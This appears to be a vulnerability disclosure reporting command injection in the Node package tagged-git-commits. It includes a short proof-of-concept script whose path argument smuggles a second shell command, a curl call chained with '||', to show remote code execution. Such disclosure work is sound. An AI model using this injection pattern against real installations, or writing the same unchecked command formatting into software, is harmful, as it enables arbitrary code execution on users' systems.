# Description

The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/aichbauer/node-tagged-git-commits/blob/master/index.js#L29

# PoC

```js
// poc.js
const taggedCommits = require('tagged-git-commits');

taggedCommits({
	path: './git || curl "http://localhost/RCE"',
});
```

# Impact
`RCE` on `tagged-git-commits` via `insecure command formatting`
